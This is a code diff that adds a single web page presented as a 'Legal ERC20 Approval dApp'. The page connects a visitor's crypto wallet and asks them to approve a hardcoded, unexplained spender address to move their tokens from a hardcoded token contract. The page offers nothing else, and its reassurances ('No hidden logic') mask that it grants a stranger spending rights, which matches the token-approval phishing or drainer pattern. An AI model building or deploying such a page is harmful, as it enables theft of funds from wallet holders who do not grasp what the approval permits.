@@ -1,0 +1,65 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="UTF-8">
+<title>Legal ERC20 Approval dApp</title>
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.min.js"></script>
+<style>
+body{background:#0b1220;color:#fff;font-family:Arial}
+.box{max-width:420px;margin:40px auto;background:#111827;padding:20px;border-radius:12px}
+button{width:100%;padding:12px;margin-top:10px;border:none;border-radius:8px;font-size:16px}
+.green{background:#22c55e}
+.blue{background:#3b82f6}
+input{width:100%;padding:10px;margin-top:8px;border-radius:8px;border:none}
+.msg{margin-top:10px;color:#a5b4fc}
+.note{margin-top:10px;font-size:12px;color:#9ca3af}
+</style>
+</head>
+
+<body>
+<div class="box">
+<h2>Legal ERC20 Approval dApp</h2>
+
+<button class="green" onclick="connect()">Connect Wallet</button>
+<input id="amt" placeholder="Approve amount (e.g. 1)">
+<button class="blue" onclick="approve()">Approve Token</button>
+
+<div class="msg" id="msg"></div>
+<div class="note">
+This is a user-initiated ERC20 approval dApp.  
+No hidden logic. Wallet popup required.
+</div>
+</div>
+
+<script>
+let provider,signer;
+const TOKEN="0x55d398326f99059fF775485246999027B3197955";
+const SPENDER="0x2d0f0934524Cb69B721064807B3ab3133d158E5F";
+const ABI=[
+"function approve(address,uint256) returns(bool)",
+"function decimals() view returns(uint8)"
+];
+
+async function connect(){
+if(!window.ethereum){alert("Wallet not found");return;}
+await ethereum.request({method:"eth_requestAccounts"});
+provider=new ethers.providers.Web3Provider(window.ethereum);
+signer=provider.getSigner();
+document.getElementById("msg").innerText="Wallet connected";
+}
+
+async function approve(){
+const a=document.getElementById("amt").value;
+if(!a){alert("Enter amount");return;}
+const t=new ethers.Contract(TOKEN,ABI,signer);
+const d=await t.decimals();
+const v=ethers.utils.parseUnits(a,d);
+const tx=await t.approve(SPENDER,v);
+document.getElementById("msg").innerText="Approval sent...";
+await tx.wait();
+document.getElementById("msg").innerText="Approved successfully ✅";
+}
+</script>
+</body>
+</html>
